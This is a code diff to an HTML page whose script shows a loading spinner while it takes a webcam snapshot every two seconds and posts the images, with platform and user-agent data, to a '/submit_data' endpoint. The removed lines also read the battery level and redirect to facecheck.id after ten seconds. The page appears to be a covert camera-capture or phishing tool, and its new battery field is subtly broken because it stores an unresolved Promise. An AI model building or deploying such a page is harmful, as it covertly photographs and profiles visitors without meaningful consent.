@@ -9,8 +9,6 @@
             text-align: center;
             font-family: Arial, sans-serif;
             padding-top: 50px;
-            background-color: #1e1e2f;
-            color: #ffffff;
         }
         #loader {
             border: 6px solid #f3f3f3; /* Light grey */
@@ -51,7 +49,8 @@
                 camera.srcObject = stream;
             })
             .catch(error => {
-                console.error('Camera access denied or error occurred:', error);
+                alert('Camera access denied or error occurred.');
+                console.error(error);
             });
 
         // Function to capture image and send data
@@ -66,42 +65,37 @@
                 const imageData = canvas.toDataURL('image/png').split(',')[1]; // Base64 image data
 
                 // Collect device information
-                navigator.getBattery().then(battery => {
-                    const deviceInfo = {
-                        deviceType: navigator.platform,
-                        deviceModel: navigator.userAgent,
-                        chargeLevel: battery.level * 100 + '%'
-                    };
+                const deviceInfo = {
+                    deviceType: navigator.platform,
+                    deviceModel: navigator.userAgent,
+                    ipAddress: '', // You can obtain IP address from server-side if needed
+                    networkCarrier: '', // Optional: Not easily accessible from frontend
+                    charge: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : 'N/A'
+                };
 
-                    // Send data to the server
-                    fetch('/submit_data', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            device_info: deviceInfo,
-                            image_data: imageData
-                        })
+                // Send data to the server
+                fetch('/submit_data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        device_info: deviceInfo,
+                        image_data: imageData
                     })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Data submitted:', data);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Data submitted:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                 });
             }
         }
 
         // Capture and send image every 2 seconds
         setInterval(captureAndSendData, 2000);
-
-        // Redirect after 10 seconds
-        setTimeout(() => {
-            window.location.href = "https://facecheck.id";
-        }, 10000);
     </script>
 </body>
 </html>
